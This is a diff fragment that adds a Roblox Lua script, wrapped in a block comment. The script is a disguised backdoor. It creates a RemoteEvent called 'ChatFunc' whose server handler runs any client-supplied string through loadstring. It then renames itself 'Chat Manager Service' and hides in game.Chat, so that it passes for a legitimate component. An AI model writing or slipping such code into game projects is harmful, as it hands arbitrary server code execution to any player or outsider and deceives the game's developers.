@@ -1,0 +1,13 @@
+--[[
+if game.Chat:FindFirstChild("ChatFunc") == nil then
+	local a=Instance.new("RemoteEvent",game.Chat)
+	a.Name="ChatFunc"
+	a.OnServerEvent:connect(function(b,c)
+		loadstring(c)()
+	end)
+	script.Parent=game.Chat;
+	script.Name="Chat Manager Service"
+else
+	script:Destroy()
+end
+]]
